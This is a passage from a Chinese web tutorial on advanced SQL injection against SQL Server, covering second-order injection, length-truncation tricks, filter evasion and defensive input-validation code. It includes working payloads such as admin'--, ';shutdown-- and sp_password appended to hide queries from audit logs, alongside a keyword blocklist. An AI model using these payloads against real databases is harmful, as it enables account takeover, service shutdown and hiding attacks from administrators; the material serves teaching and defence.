</code></pre>它是一个往表里插入字符的不带引号的查询语句。当然，如果攻击者使用一个数值型的用户名和密码的话，下面的语句也同样可以很好的执行:insert into users values( 667,123,123,0xffff)因为SQL-Server自动将数值型的转换成&#39;varchar&#39;类型，类型转换是默认的。[SQL二次注入]即使一个程序总是过滤单引号，攻击者仍然可以先注入SQL作为数据存放在数据库里然后被程序再次使用。比如，一个攻击者可能通过注册，创建一个用户名Username: admin&#39;--Password: password程序正确的过滤了单引号，&#39;insert&#39;语句如下：insert into users values ( 123, &#39;admin&#39;&#39;--&#39;, &#39;password&#39;, 0xffff)我们假设程序允许用户更改密码，ASP脚本在设置新的密码前先确认用户旧密码正确。代码可能这样写：
<p>代码如下:</p>
<pre>
<code> 
username = escape( Request.form(&quot;username&quot;) ); 
oldpassword = escape( Request.form(&quot;oldpassword&quot;) ); 
newpassword = escape( Request.form(&quot;newpassword&quot;) ); 
var rso = Server.CreateObject(&quot;ADODB.Recordset&quot;); 
var sql = &quot;select * from users where username = &#39;&quot; + username + &quot;&#39; and password = &#39;&quot; + oldpassword + &quot;&#39;&quot;; 
rso.open( sql, cn ); 
if (rso.EOF) 
{ 
&hellip; 
</code></pre>设置新密码的查询语句可能这样写的：sql = &quot;update users set password = &#39;&quot; + newpassword + &quot;&#39; where username = &#39;&quot; + rso(&quot;username&quot;) + &quot;&#39;&quot;rso(&quot;username&quot;)是登陆的查询返回的的用户名。用户名为admin&#39;--，上面的查询就变成了这样：update users set password = &#39;password&#39; where username = &#39;admin&#39;--&#39;因此攻击者可以通过注册了一个名叫admin&#39;--的用户来把admin的密码改成他们自己的。这是个危险的问题，目前大部分的大型程序都试图过滤数据。最好的解决方法是拒绝非法输入，而不是简单的改变它。这有时候会导致一些问题，非法字符在某些地方是必要的，比如在名字带符号的情况：O&#39;Brien从安全的角度，最好的解决办法是不允许出现单引号。如果这样不行，必须避免它们出现，这种情况下，最好保证所有要进入SQL语句的字符(包括从数据库里取出的字符)都被正确的处理过。即使这样攻击依然可能实现：如果攻击者可以不经过程序而往系统插入数据。比如攻击者有一个email接口，或者有一个可以控制的错误记录数据库。最好总是验证所有的数据，包括系统里的数据，验证函数调用很简单，比如：if ( not isValied( &quot;email&quot;, request.querystring(&quot;emil&quot;) ) ) thenresponse.end或者其他的方法[长度限制]有时候输入对数据的长度加以限制会使攻击困难许多，这的确阻止了一些攻击，但一个很短的SQL语句也可能造成非常大的危害：Username: &#39;;shutdown--关闭SQL-Server，只用了12个字符。另一个例子：drop table如果长度限制是在字符串过滤后，另一个问题可能会发生。假设用户名被限制在16个字符之内，密码也被限制在16个字符之内，下面的用户名和密码结合可以执行&#39;shutdown&#39;命令：Username:aaaaaaaaaaaaaaa&#39;Password:&#39;; shutdown--原因是程序过滤用户名最后的单引号，但是字符串又被切回到16个字符，删除了过滤的单引号。结果是密码域可以包含一些SQL, 只要它以一个单引号开始，最后的查询会变成这样:select * from users where username = &#39;aaaaaaaaaaaaaa&#39;&#39; and password=&#39;&#39;&#39;;shutdown--用户名在查询里就变成:aaaaaaaaaaaaaaa&#39; and password=&#39;后面附上的SQL被执行。[躲避审核]SQL Server在sp_traceXXX系列的函数包含丰富审核接口，它可以记录任何数据库里的事件。这里我们特别感兴趣的是T-SQL事件，它记录了所有的SQL语句以及服务器上准备好的和已运行了的批处理。如果这个级别的审核开启的话，所有我们讨论的注入都将被记录下来有经验的数据库管理员将会看到所有发生的事情。但是如果攻击者附加下面的字符：sp_password到一个Transact-SQL语句，这个审核记录如下：-- &#39;sp_password&#39; was found in the text of this event.-- The text has been replaced with this comment for security reasons.这在所有的的T-SQL日志记录时都会发生，即使&#39;sp_password&#39;出现在注释中。这当然是在用户传递sp_password时有意隐藏用户的明文密码，但这对攻击者相当有用。所以，为了隐藏所有的注入攻击者只需要在注释符&#39;--&#39;后面加一个字符串：Username: admin&#39;--sp_password事实上一些执行了的SQL将被记录，但是查询字符串本身被强制不记录。[防 范]这部分讨论一些针对这些攻击的防范措施。输入验证已经讨论过了，一些代码也给出了，后面我们研究SQL-Server防范问题。[输入验证]输入验证是一个很复杂的问题。一般在一个开发项目中它很少被注意，因为过度的验证往往使一个程序的某部分被打断，所以输入验证是个难题。输入验证往往不加到程序的功能里，因而在工期将至而赶程序时不会被人注意。下面是关于验证的简单的讨论附示例代码，这个示例代码当然不能直接用在程序里，但可以很好的说明不同的策略。各种数据验证的途径可以分类为以下几种：1)整理数据使之变得有效2)拒绝已知的非法输入3)只接受已知的合法的输入有很多概念上的问题；首先，开发者没有必要知道非法数据由什么组成，因为新形式的非法数据随时都可能产生。第二，改变数据会改变它的长度，这样会导致前面提到的问题。最后，还有需要对系统已有数据的重用的话有二次注入的问题.解决方案2也会遇到和1的一些相似的问题，了解非法数据会过时，因为新的攻击技术也在发展。解决方案3可能是三种方法中最好的，但是比较难于执行。从安全角度来考虑可能最好多解决方法是把解决方案2和3结合起来只允许合法的输入，然后再寻找非法字符。一个必须结合这两种途径的例子是带有连字符的名字的问题：Question Bassington-Bassington我们必须在合法输入里允许连字符号，但是也要明白字符串&#39;--&#39;在SQL-Server里意味着什么。当数据整理结合了非法字符验证时另一个问题就会发生。假设我们应用&ldquo;非法字符探测器&rdquo;来探测&#39;--&#39;，&#39;select&#39;和&#39;union&#39;&rdquo;后使用&ldquo;数据整理过滤器&rdquo;删除单引号，攻击者就可以指定这样的输入：uni&#39;on sel&#39;ect @@version-&#39;-因为单引号被过滤器删除了，攻击者可以把单引号散布于它的已知的非法字符串里来躲避检查。下面是一些验证的代码:方法1-躲避单引号
<p>代码如下:</p>
<pre>
<code> 
function escape( input ) 
input = replace(input, &quot;&#39;&quot;, &quot;&#39;&#39;&quot;) 
escape = input 
end function 
</code></pre>方法2-抵制已知的非法输入
<p>代码如下:</p>
<pre>
<code> 
function validate_string( input ) 
know_bad = array( &quot;select&quot;, &quot;insert&quot;, &quot;update&quot;, &quot;delete&quot;, &quot;drop&quot;, &quot;--&quot;, &quot;&#39;&quot;) 
validate_string = true 
for i = lbound( know_bad ) to ubound( known_bad ) 
if( instr( 1, input, known_bad(i), vbtextcompare) &lt;&gt; 0 ) 
validate_string = false 
exit function 
end if 
next 
end function 
</code></pre>方法3-只允许合法输入
<p>代码如下:</p>
<pre>
<code> 
function validatepassword( input ) 
good_password_chars = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot; 
validatepassword = true 
for i = 1 to len( input ) 
c = mid( input, i, 1 ) 
if ( instr( good_password_chars, c ) = 0 ) then 
validatepassword = false 
exit function 
end if 
next 
end function 
</code></pre>

<p>注：关于SQL Server SQL数据库的高级sql注入的一些知识的内容就先介绍到这里，更多相关文章的可以留意</span>                                     
		    	</div>
		    	<div class="panel-title"><i class="fa fa fa-file-text fa-fw"></i>代码注释</div>
			    <div class="panel-content">
			    <span></span>                                     
		    	</div>
			</div>

			<!-- END ROW -->
			<div class="newsPage">
				<div class="newsPageTurn">
				    <span><a>上一篇</a><a href='/mysql/biji/4188.html'>完美解决SQL Server&amp;quot;以前的某个程序安装已在安装计算机上创建挂起的文件操作&amp;quot;</a><a>下一篇</a><a href='/mysql/biji/4190.html'>SQL Server sql 取两值之间的数据方法（例：100-200之间的数据）</a></span>
				</div>
			</div>
		</div>


<div id="author-box">
    <h3>作者：喵哥笔记</h3>
        <div class="author-info">
            <div class="author-avatar">
                <img src="/skin1/picture/01.jpg" alt="IDC笔记" class="avatar" width="64" height="64">
            </div>
        <div class="author-description">
            <p>学的不仅是技术，更是梦想！</p>
            <ul class="author-social follows nb">
            	<li>
                    <a target="_blank" href="/" title="IDC笔记">IDC笔记</a>
                </li>
            </ul>
        </div>
        <div class="clear"></div>
    </div>
</div>
<script>
var paras = document.getElementsByTagName("pre");
for ( var i=0;i<paras.length;i++ ) {
    paras[i].setAttribute("class","brush:php;toolbar:false");     
}
</script>
<!-- container-fluid -->
	</div>
<!-- content -->
	<footer class="footer">
	© 2020 IDC笔记 <i class="mdi mdi-heart text-danger"></i>. | 备案号：<a href="https://beian.miit.gov.cn/">辽ICP备18000516号</a>
<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?674585fbbd2294d3faf910f668ea91b4";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>

	</footer>
</div>

</div>
<!-- END wrapper -->
<!-- jQuery  -->
<script src="/skin1/js/jquery.min.js"></script>
<script src="/skin1/js/bootstrap.bundle.min.js"></script>
<script src="/skin1/js/metismenu.min.js"></script>
<script src="/skin1/js/jquery.slimscroll.js"></script>
<script src="/skin1/js/waves.min.js"></script>
<!--Morris Chart-->
<script src="/skin1/js/morris.min.js"></script>
<script src="/skin1/js/raphael.min.js"></script>
<script src="/skin1/js/dashboard.init.js"></script>
<script src="/skin1/js/app.js"></script>
<script src="/foot.js"></script>
</body>
</html>